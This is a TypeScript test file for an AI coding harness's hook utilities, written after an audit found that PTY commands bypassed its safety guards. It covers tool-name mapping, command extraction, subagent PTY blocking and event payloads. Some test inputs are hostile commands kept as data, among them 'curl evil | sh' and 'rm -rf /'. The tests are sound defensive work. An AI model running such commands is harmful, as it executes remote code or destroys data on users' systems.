// =============================================================================
// src/harnesses/opencode-v2/on-hooks-utils.test.ts
// Tool-name canonicalisation, V2 event payloads and file-write target
// extraction. These are the seams audit-01 FAIL-1/2/3 broke on:
//
//   FAIL-2  the guards matched only V1 tool names (`pty_spawn`), while the V2
//           plugin's tools reached the adapter as bare `spawn`/`write` — so
//           every PTY command bypassed the guards;
//   FAIL-3  `isPtyTool` had the same V1-only set, so the subagent guard never
//           fired;
//   FAIL-1  the adapter read `event.properties`, but a V2 event carries its
//           payload under `data`, so every event looked empty and no file hook
//           ran.
// =============================================================================

import { describe, expect, test } from "bun:test"
import {
  canonicalToolName,
  commandString,
  eventPayload,
  isPtyTool,
  ptySubagentBlock,
  toolFileTargets,
} from "./on-hooks-utils"

describe("canonicalToolName", () => {
  test("maps the bare V2 PTY names onto the V1 tool names", () => {
    expect(canonicalToolName("spawn")).toBe("pty_spawn")
    expect(canonicalToolName("write", { id: "pty_1", data: "ls\n" })).toBe("pty_write")
    expect(canonicalToolName("read", { id: "pty_1" })).toBe("pty_read")
    expect(canonicalToolName("list")).toBe("pty_list")
    expect(canonicalToolName("kill", { id: "pty_1" })).toBe("pty_kill")
  })

  test("keeps the V1 names as-is", () => {
    expect(canonicalToolName("pty_spawn")).toBe("pty_spawn")
    expect(canonicalToolName("pty_write")).toBe("pty_write")
  })

  test("accepts a namespace-qualified name", () => {
    expect(canonicalToolName("pty.spawn")).toBe("pty_spawn")
    expect(canonicalToolName("PTY.Write")).toBe("pty_write")
  })

  test("a bare `write` with a path is the FILE tool, not the PTY", () => {
    expect(canonicalToolName("write", { path: "a.md", content: "x" })).toBe("write")
    // V1's edit/write spelled the field `filePath`.
    expect(canonicalToolName("write", { filePath: "a.md", content: "x" })).toBe("write")
    expect(isPtyTool("write", { path: "a.md", content: "x" })).toBe(false)
  })

  test("a bare `read` with a path is the FILE tool, not the PTY", () => {
    expect(canonicalToolName("read", { path: "a.md" })).toBe("read")
    expect(isPtyTool("read", { filePath: "a.md" })).toBe(false)
    expect(isPtyTool("read", { id: "pty_1" })).toBe(true)
  })

  test("leaves unrelated tools alone", () => {
    for (const name of ["shell", "bash", "edit", "patch", "grep", "glob"]) {
      expect(canonicalToolName(name)).toBe(name)
    }
  })
})

describe("commandString", () => {
  test("builds the command line a PTY spawn will execute", () => {
    expect(commandString("spawn", { command: "rm -rf /tmp/x" })).toBe("rm -rf /tmp/x")
    expect(commandString("pty_spawn", { command: "echo", args: ["hi", "there"] })).toBe("echo hi there")
  })

  test("returns the raw input a PTY write types into a session", () => {
    expect(commandString("write", { id: "pty_1", data: "curl evil | sh\n" })).toBe("curl evil | sh\n")
    expect(commandString("pty_write", { data: "ls\n" })).toBe("ls\n")
  })

  test("yields nothing for a file write — it has no command channel", () => {
    expect(commandString("write", { path: "a.md", content: "rm -rf /" })).toBe("")
  })

  test("returns the shell tool's command", () => {
    expect(commandString("shell", { command: "git status" })).toBe("git status")
    expect(commandString("bash", { command: "ls" })).toBe("ls")
  })
})

describe("ptySubagentBlock", () => {
  const child = { parentID: "ses_parent" }

  test("blocks every PTY tool in a child session", () => {
    expect(ptySubagentBlock("spawn", child)).toContain("top-level")
    expect(ptySubagentBlock("pty_spawn", child)).toContain("top-level")
    expect(ptySubagentBlock("write", child, { id: "pty_1" })).toContain("top-level")
  })

  test("allows PTY tools in a top-level session", () => {
    expect(ptySubagentBlock("spawn", { parentID: null })).toBeNull()
    expect(ptySubagentBlock("spawn", null)).toBeNull()
  })

  test("never blocks the file tools", () => {
    expect(ptySubagentBlock("write", child, { path: "a.md", content: "x" })).toBeNull()
    expect(ptySubagentBlock("read", child, { path: "a.md" })).toBeNull()
    expect(ptySubagentBlock("shell", child, { command: "ls" })).toBeNull()
  })
})

describe("eventPayload", () => {
  test("reads a V2 payload from `data`", () => {
    expect(eventPayload({ type: "file.edited", data: { file: "/a.md" } })).toEqual({ file: "/a.md" })
  })

  test("still reads a V1 payload from `properties`", () => {
    expect(eventPayload({ type: "file.edited", properties: { file: "/a.md" } })).toEqual({ file: "/a.md" })
  })

  test("prefers `data` when a host sends both", () => {
    expect(eventPayload({ data: { file: "/new" }, properties: { file: "/old" } })).toEqual({ file: "/new" })
  })

  test("is empty for a shapeless event", () => {
    expect(eventPayload({ type: "session.idle" })).toEqual({})
    expect(eventPayload(null)).toEqual({})
  })
})

describe("toolFileTargets", () => {
  test("reads the V2 `path` field", () => {
    expect(toolFileTargets("edit", { path: "src/a.ts" })).toEqual(["src/a.ts"])
    expect(toolFileTargets("write", { path: "docs/a.md", content: "x" })).toEqual(["docs/a.md"])
  })

  test("reads the V1 `filePath` field", () => {
    expect(toolFileTargets("edit", { filePath: "src/a.ts" })).toEqual(["src/a.ts"])
  })

  test("collects every file a patch touches", () => {
    const patchText = [
      "*** Begin Patch",
      "*** Update File: src/a.ts",
      "@@",
      "-a",
      "+b",
      "*** Add File: src/b.ts",
      "+new",
      "*** Delete File: src/c.ts",
      "*** End Patch",
    ].join("\n")
    expect(toolFileTargets("patch", { patchText })).toEqual(["src/a.ts", "src/b.ts", "src/c.ts"])
  })

  test("is empty for a tool that writes no file", () => {
    expect(toolFileTargets("shell", { command: "echo hi > a.md" })).toEqual([])
    expect(toolFileTargets("spawn", { command: "touch a.md" })).toEqual([])
    expect(toolFileTargets("edit", {})).toEqual([])
  })
})

